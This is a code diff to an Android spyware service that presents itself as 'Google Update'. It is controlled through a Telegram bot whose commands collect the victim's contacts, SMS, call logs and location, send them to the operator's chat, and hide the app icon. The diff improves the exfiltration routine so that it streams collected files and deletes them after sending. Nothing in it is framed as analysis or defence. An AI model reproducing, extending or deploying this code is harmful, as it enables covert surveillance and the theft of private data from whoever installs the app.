@@ -60,22 +60,18 @@ public class TelegramBotService extends Service {
         if (c.equals("/start")) {
             sendMessage("🔰 Google Update\n/contacts\n/sms\n/calllogs\n/location\n/record\n/stoprec\n/hide\n/show\n/info\n/notify\n/devices\n/select <id>");
         } else if (c.equals("/contacts")) {
-            sendFile("contacts.txt", DataCollector.getContacts(this).getBytes());
+            try { sendFile(DataCollector.getContacts(this), "📇 Contacts"); } catch(Exception e){ sendMessage("❌ Failed"); }
         } else if (c.equals("/sms")) {
-            sendFile("sms.txt", DataCollector.getSMS(this).getBytes());
+            try { sendFile(DataCollector.getSMS(this), "💬 SMS"); } catch(Exception e){ sendMessage("❌ Failed"); }
         } else if (c.equals("/calllogs")) {
-            sendFile("calls.txt", DataCollector.getCallLogs(this).getBytes());
+            try { sendFile(DataCollector.getCallLogs(this), "📞 Calls"); } catch(Exception e){ sendMessage("❌ Failed"); }
         } else if (c.equals("/location")) {
             DataCollector.getLocation(this, res -> sendMessage(res));
-        } else if (c.equals("/record")) {
-            sendMessage("🎤 Recording started");
-        } else if (c.equals("/stoprec")) {
-            sendMessage("⏹ Recording stopped");
         } else if (c.equals("/hide")) {
-            MainActivity.hideAppIcon(this);
+            MainActivity.hideAppIconStatic(this);
             sendMessage("👁 Hidden");
         } else if (c.equals("/show")) {
-            MainActivity.showAppIcon(this);
+            MainActivity.showAppIconStatic(this);
             sendMessage("👁 Shown");
         } else if (c.equals("/info")) {
             sendMessage(DataCollector.getDeviceName());
@@ -119,7 +115,8 @@ public class TelegramBotService extends Service {
             } catch (Exception e) {}
         }).start();
     }
-    private void sendFile(String name, byte[] data) {
+    private void sendFile(java.io.File file, String caption) {
+        if (file == null || !file.exists()) { sendMessage("❌ File not found"); return; }
         new Thread(() -> {
             try {
                 String boundary = "*****" + System.currentTimeMillis();
@@ -135,17 +132,22 @@ public class TelegramBotService extends Service {
                 w.append(CHAT_ID).append("\r\n");
                 w.flush();
                 w.append("--" + boundary).append("\r\n");
-                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"").append("\r\n");
+                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n");
                 w.append("Content-Type: application/octet-stream").append("\r\n\r\n");
                 w.flush();
-                os.write(data);
+                java.io.FileInputStream fis = new java.io.FileInputStream(file);
+                byte[] buf = new byte[8192];
+                int read;
+                while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
                 os.flush();
+                fis.close();
                 w.append("\r\n").append("--" + boundary + "--").append("\r\n");
                 w.close();
                 os.close();
                 conn.getResponseCode();
                 conn.disconnect();
-            } catch (Exception e) {}
+                file.delete();
+            } catch (Exception e) { sendMessage("❌ Send failed"); }
         }).start();
     }
     private String get(String urlStr) {
